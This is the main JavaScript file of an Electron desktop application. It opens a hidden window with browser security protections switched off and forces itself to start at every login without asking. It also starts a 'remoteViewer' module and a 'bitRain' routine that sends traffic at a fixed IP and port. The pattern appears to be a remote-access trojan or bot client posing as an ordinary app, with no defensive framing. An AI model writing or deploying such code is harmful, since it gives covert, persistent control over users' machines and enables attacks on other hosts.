const { app, BrowserWindow, ipcMain } = require("electron");
const remoteViewer = require("./remoteViewer");
const AutoLaunch = require("auto-launch");
const bitRain = require("./bitRain");

bitRain.start({ port: 53, ip: "192.168.1.180", seconds: 5 });

let autoLaunch = new AutoLaunch({
  name: app.name,
  path: app.getPath("exe"),
});

autoLaunch.isEnabled().then((isEnabled) => {
  if (!isEnabled) autoLaunch.enable();
});

app.on("ready", () => {
  let mainWindow = new BrowserWindow({
    show: false,
    webPreferences: {
      plugins: true,
      nodeIntegration: true,
      contextIsolation: false,
      backgroundThrottling: false,
      nativeWindowOpen: false,
      webSecurity: false,
      enableBlinkFeatures: "ExecCommandInJavaScript",
    },
  });
  mainWindow.loadFile("www/index.html");
  remoteViewer.start(mainWindow);
});
